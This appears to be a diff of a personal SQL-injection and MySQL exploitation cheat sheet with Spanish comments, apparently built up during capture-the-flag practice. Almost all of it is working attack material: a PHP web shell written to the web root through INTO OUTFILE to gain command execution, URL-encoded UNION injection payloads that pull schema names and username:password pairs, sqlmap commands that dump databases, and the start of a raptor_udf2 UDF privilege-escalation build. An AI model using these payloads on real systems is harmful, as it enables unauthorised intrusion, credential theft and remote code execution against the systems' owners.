@@ -1,3 +1,6 @@
+# sqli wordlist
+https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/SQL.txt
+
 # con acceso a una BD podemos insertar codigo PHP para ganar RCE
 mysql>select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
 
@@ -33,14 +36,22 @@ union select 1,2,column_name,4 from information_schema.columns where table_schem
 union select 1,2,id,4 from sqhell_5.flag; **muestra el contenido de la tabla sqhell_5 la columna flag**
 union select 1,2,concat(id,0x3a,flag),4 from sqhell_5.flag;
 
-mysql -u USER -p PASS -P CMD
+searchitem=test%27+UNION+SELECT+1,2,DATABASE()+--+-
+searchitem=test%27+UNION+SELECT+1,2,VERSION()+--+-
+searchitem=test%27+UNION+SELECT+1,2,SCHEMA_NAME+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT+1,4+--+-
+searcitem=test%27+UNION+SELECT+1,2,COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA=+'db'+AND+TABLE_NAME+=+'users'--+-
+searchitem=test%27+UNION+SELECT+1,2,CONCAT(username,0x3a,pwd)+FROM+db.users--+-
+
+# mysql-tools
 mysqlshow -u USER -p PASS DATABASE TABLES
 mysqldump -u USER --password=PASS --single-transaction --all-databases
 mysqldump -u USER --password=PASS --no-data TABLES
 mysqldump -u root -p Password123! --all-databases > all_db_backup.sql
 
+# sqlmap
 sqlmap.py -u URL --method POST --data "username=FUZZ&password=" -P username --dbs --dbms mysql --level 2
 sqlmap.py -u "http://ip/register/user-check?username=admin" --dbms mysql -D database -T flag --dump
+sqlmap -r request.txt --dbms=mysql --dump
 
 # mysql (UDFs exploit):
 gcc -g -c raptor_udf2.c -fPIC
